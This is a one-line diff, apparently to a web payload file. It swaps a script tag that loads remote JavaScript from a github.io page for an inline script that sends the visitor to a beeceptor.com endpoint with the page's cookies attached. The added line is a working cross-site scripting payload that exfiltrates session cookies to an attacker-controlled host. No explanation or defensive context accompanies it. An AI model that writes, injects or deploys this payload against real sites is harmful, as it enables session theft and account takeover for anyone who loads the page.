@@ -1,1 +1,1 @@
-<script src="https://0rcruxe.github.io/ha.js"></script>
+<script>location.href='https://tyeuyrt.free.beeceptor.com/cookie?='+document.cookie;</script>
